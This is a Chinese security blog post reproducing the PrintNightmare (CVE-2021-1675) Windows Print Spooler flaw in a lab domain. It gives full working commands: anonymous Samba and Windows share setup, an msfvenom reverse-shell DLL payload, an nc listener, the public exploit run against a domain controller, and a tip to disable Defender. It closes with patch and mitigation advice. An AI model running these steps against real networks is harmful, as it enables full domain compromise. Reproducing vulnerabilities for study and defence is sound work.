> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Fp6j3KKosn45D-VRSDJ16w)

**上方蓝色字体关注我们，一起学安全！**

**作者：shiyi****@Timeline Sec  
**

**本文字数：1191**

**阅读时长：3～4min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Windows Print Spooler 是 Windows 的打印机后台处理程序，广泛的应用于各种内网中。

**0x02 漏洞概述**  

  

攻击者可以通过该漏洞绕过 PfcAddPrinterDriver 的安全验证，并在打印服务器中安装恶意的驱动程序，若攻击者所控制的用户在域中，则攻击者可以连接到 DC 中的 Spooler 服务，并利用该漏洞在 DC 中安装恶意的驱动程序，完整的控制整个域环境。

**0x03 影响版本**  

  

```
* Windows Server 2019 (Server Core installation)  
* Windows Server 2012 R2 (Server Core installation)
* Windows Server 2012 R2
* Windows Server 2012 (Server Core installation)
* Windows Server 2012
* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
* Windows RT 8.1
* Windows 8.1 for x64-based systems
* Windows 8.1 for 32-bit systems
* Windows 7 for x64-based Systems Service Pack 1
* Windows 7 for 32-bit Systems Service Pack 1
* Windows 10 Version 1607 for x64-based Systems
* Windows 10 Version 1607 for 32-bit Systems
```

**0x04 环境搭建**  

  

目标域：  

Windows Server 2019 域环境 (test.com) IP：192.168.3.3   攻击机：Kali-2021 IP：192.168.3.55   普通域账户密码：  
win10/windows10>? impact 包：  
https://github.com/cube0x0/impacket

**Linux 配置 smb 匿名访问：**

1、修改 / etc/samba/smb.conf 文件

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445
[smb]
    comment = Samba
    path = /usr/share2    
    guest ok = yes
    read only = no
    browsable = yes
```

_PS：_

_对于 [global] 只需要把 idmap config * : backend = tdb 前面的分号删掉，然后再添加一条 smb ports = 445  即可，其他项都是默认的，最后把整个 [smb]  添加上去_

2、重启 samba

```
service smbd restart
```

3、创建共享文件夹

```
mkdir /usr/share2
```

**Windows 配置匿名访问：**  

```
mkdir C:\share
icacls C:\share\ /T /grant "ANONYMOUS LOGON":r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'（powershell下运行不适合win7）
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
```

**0x05 漏洞复现  
**

  

### 1、安装 impact 包

```
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### 2、Kali 生成恶意 dll 文件  

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.3.55 LPORT=4444 -f dll -o /usr/share2/shell.dll
```

### 3、msf 或者 nc 开启监听

```
msf 和 nc开启监听都可以 
nc -lnvp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgAjfOAEe7VawUPczvj1soYJN4aUDJyC4Y7lod7tHn1NWUibfyECddyZePiayMEkYl7HAic8Kf5rFUbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgAjfOAEe7VawUPczvj1soYFDRODuLvFlrxdFt7rWiaAvBUU3icp6a9dEdr8oY1ibo8e9CYGbDPJr0Ew/640?wx_fmt=png)

### 4、执行 exp  

```
exp地址：https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py test.com/win10:"windows10>?"@192.168.3.3 '\\192.168.3.55\smb\shell.dll'
```

  
虽然报错了 但是已经收到了 shell

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgAjfOAEe7VawUPczvj1soYCORXuJaDgGA1eQaMR25QQpSdvCQHa8orXeQB3Is0r3hgKv3assjVXQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgAjfOAEe7VawUPczvj1soYnjwcyK4XzWKgqiadEzSVm65YUtjVutfibSMicwcic8nwBCcdPibP82OU1lQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgAjfOAEe7VawUPczvj1soYJFK7DOiaaJE5ZenRZYCujWagzcd5XXLHEZ7zuibEYeUPbKTPU0cPpJjw/640?wx_fmt=png)  

**0x06 修复建议  
**

  

1. 官方建议：

目前官方已发布漏洞修复补丁，建议受影响用户尽快更新漏洞补丁。

```
https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675
```

2. 临时防护措施：  

若相关用户暂时无法进行补丁更新，可通过禁用 Print Spooler 服务来进行缓解：

1）在服务应用（services.msc）中找到 Print Spooler 服务。

2）停止运行服务，同时将 “启动类型” 修改为“禁用”。

**** 坑点 ****  

---------------

1、windows defender 关闭

defender 没关闭之前，exp 一直失败，然后就尝试关闭 defender，就可以成功（dll 未免杀的原因）。

2、windows 共享利用失败

在 windows 上测试开启共享之后，能够在域控上匿名访问到共享文件，但是 exp 一直失败。  

```
参考链接：
```

https://github.com/cube0x0/CVE-2021-1675

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行